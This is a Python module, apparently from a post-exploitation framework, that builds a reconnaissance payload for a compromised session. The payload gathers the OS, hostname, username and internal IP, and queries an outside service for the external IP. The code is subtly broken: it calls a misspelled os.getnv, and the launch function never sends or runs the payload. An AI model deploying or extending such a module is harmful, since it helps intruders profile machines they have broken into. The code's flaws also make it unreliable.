
#basic module description
def description() -> str:
    return "Device info gatherer"

#basic module rank
def rank() -> str:
    return "Excellent"

#basic module date
def date() -> str:
    return "18.04.2026"

#set arguments
def depargs() -> dict:
    return {
        "session": "Session number"
    }

#imports
from StrFuncs import err, evnt, timenow

#main function
def main() -> None:
    pass

#launch func
def launch(args) -> None:
    sid = int(args.get("session"))
    payload = """
import socket, platform, subprocess, os, urllib.request
def getextip():
    try:
        return urllib.request.urlopen("https://ident.me", timeout=3).read().decode("utf-8")
    except:
        return "N/A"
def collectrecon():
    info = {
        "OS": f"{platform.system()} {platform.release()} ({os.name})",
        "Hostname": socket.gethostname(),
        "User": os.getlogin() if os.name != 'nt' else os.getnv("USERNAME"),
        "Internal IP": socket.gethostbyname(socket.gethostname()),
        "External IP": getextip(),
        "CPU Arch": platform.machine()
    }   
    for k, v in info.items():
        print("[+] ", k, v)
collectrecon()
"""
